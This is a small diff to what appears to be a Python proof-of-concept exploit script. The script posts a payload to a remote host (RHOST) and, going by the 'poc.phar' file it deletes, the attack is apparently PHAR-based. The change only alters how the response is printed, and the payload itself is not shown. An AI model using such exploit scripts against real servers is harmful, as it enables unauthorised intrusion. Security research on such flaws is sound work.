@@ -40,10 +40,13 @@ r = requests.post('https://%s'%RHOST,
     data='message='+payload,
     headers={'Content-Type':'application/x-www-form-urlencoded'}
 )
-print(r.text)
+
 if 'stored' not in r.text:
     print("[-] Failed")
     sys.exit(-1)
+
+msg_name = r.text[:-1].split("/")[-1]
+print("    -- " + msg_name)
 
 print("[*] Removing phar/image...")
 subprocess.Popen(["rm","poc.phar"])
